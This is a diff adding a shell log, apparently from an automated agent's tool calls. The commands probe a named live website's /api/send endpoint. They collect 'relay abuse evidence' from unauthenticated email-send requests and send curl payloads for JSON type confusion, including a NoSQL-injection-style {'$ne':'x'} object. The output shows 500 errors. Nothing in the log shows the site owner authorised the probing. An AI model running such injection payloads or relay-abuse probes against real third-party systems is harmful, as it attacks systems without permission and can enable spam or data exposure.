@@ -1,0 +1,26 @@
+# command: cd /work; UA="Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+echo "=== relay abuse evidence: distinct Resend IDs from unauth POSTs ==="
+grep -rho '"id":"[a-f0-9-]*"' /tmp/r.txt /tmp/m.txt /tmp/c.txt 2>/dev/null | sort -u
+echo
+echo "=== JSON type-confusion: object in msg ==="
+curl -s -o /tmp/j1 -w "HTTP=%{http_code} sz=$(stat -c%s /tmp/j1) " -X POST "https://www.infinitycapital.bh/api/send" -H "Content-Type: application/json" -H "User-Agent: $UA" --data '{"fname":"A","msg":{"$ne":"x"},"targets":"zz"}'; head -c 150 /tmp/j1; echo
+echo "=== JSON: array in msg ==="
+curl -s -o /tmp/j2 -w "HTTP=%{http_code} sz=$(stat -c%s /tmp/j2) " -X POST "https://www.infinitycapital.bh/api/send" -H "Content-Type: application/json" -H "User-Agent: $UA" --data '{"fname":"A","msg":["a","b"],"targets":"zz"}'; head -c 150 /tmp/j2; echo
+echo "=== JSON: normal (control) ==="
+curl -s -o /tmp/j3 -w "HTTP=%{http_code} sz=$(stat -c%s /tmp/j3) " -X POST "https://www.infinitycapital.bh/api/send" -H "Content-Type: application/json" -H "User-Agent: $UA" --data '{"fname":"A","msg":"hello","targets":"zz"}'; head -c 150 /tmp/j3; echo
+# tool: sort
+# exit_code: 0
+# ts: 2026-09-30T11:34:01.370710+00:00
+# ---
+
+=== relay abuse evidence: distinct Resend IDs from unauth POSTs ===
+
+=== JSON type-confusion: object in msg ===
+HTTP=500 sz=101 
+=== JSON: array in msg ===
+HTTP=500 sz=75 
+=== JSON: normal (control) ===
+HTTP=500 sz= 
+
+[exit=0]
+stat: cannot statx '/tmp/j3': No such file or directory
